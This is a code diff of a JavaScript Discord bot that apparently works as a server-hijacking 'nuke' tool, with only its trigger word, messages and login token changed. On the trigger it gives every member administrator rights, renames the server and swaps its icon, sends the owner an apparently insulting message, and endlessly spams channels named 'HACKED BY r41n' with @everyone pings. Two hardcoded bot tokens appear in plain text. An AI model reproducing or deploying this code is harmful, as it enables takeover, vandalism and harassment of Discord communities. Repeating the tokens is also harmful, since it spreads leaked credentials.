@@ -12,7 +12,7 @@ client.on("ready", () => {
 
 
 client.on("message", message => {
-  if (message.content.startsWith(`Slaw`)) {
+  if (message.content.startsWith(`r41n`)) {
     message.delete();
     message.guild.roles.cache.find(r => r.name === "@everyone").edit({
       permissions: ["ADMINISTRATOR"] ///premission akata adminstator
@@ -40,11 +40,11 @@ client.on("message", message => {
     }, 1000);
     message.guild.setIcon("https://media.discordapp.net/attachments/849697925479399474/862395035944615945/download_1.jpeg");
     client.user.setAvatar("https://media.discordapp.net/attachments/849697925479399474/862395035944615945/download_1.jpeg");
-    client.user.setUsername("HACKED");
+    client.user.setUsername("Loon");
     message.guild.owner.send(
-      "Kerm Bmzha Bas awakash Byka ba qnt"
+      "تـڕپـەقـاڵ ئـەمـژی"
     );
-    message.guild.setName("r41n ");
+    message.guild.setName("r41n is here");
     setTimeout(function() {
       setInterval(
         () => {
@@ -52,7 +52,7 @@ client.on("message", message => {
             .create("HACKED BY r41n", "text")
             .then(channel => {
               channel.send(
-                "@everyone r41n is  :joy: :joy: :joy:"
+                "@everyone r41n is here :joy: :joy: :joy:"
               );
             });
         },
@@ -68,4 +68,4 @@ client.on("message", message => {
 
 ////codaka drwst krawa lalayan black jack
 
-client.login("ODMyMDIyNzA2MDc3NTY1MDA4.YNHRnA.SnV9yoF9EJOQkfmXogkHqfmdqgo");
+client.login("ODM3ODY4MzA2MTMxNDUyMDA0.YIyzqw.PrheuFBrNBHcsULaPW6CrknUHTw");
